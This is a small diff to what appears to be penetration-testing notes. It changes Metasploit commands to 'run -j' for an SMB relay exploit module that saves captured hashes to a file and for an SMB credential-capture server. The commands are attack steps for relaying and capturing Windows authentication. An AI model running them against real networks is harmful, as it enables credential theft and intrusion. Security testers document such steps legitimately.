@@ -50,7 +50,7 @@ msf exploit(windows/smb/smb_relay) > set relay_targets <target1_IP>,<target2_IP>
 
 msf exploit(windows/smb/smb_relay) > set johnpwfile ./relay_output.txt
 
-msf exploit(windows/smb/smb_relay) > exploit
+msf exploit(windows/smb/smb_relay) > run -j
 ```
 
 ## 02 - Metasploit auxiliary module SMB server
@@ -93,7 +93,7 @@ msf auxiliary(server/capture/smb) > set srvhost <IP>
 
 msf auxiliary(server/capture/smb) > set srvport <PORT>
 
-msf auxiliary(server/capture/smb) > run
+msf auxiliary(server/capture/smb) > run -j
 ```
 
 ---
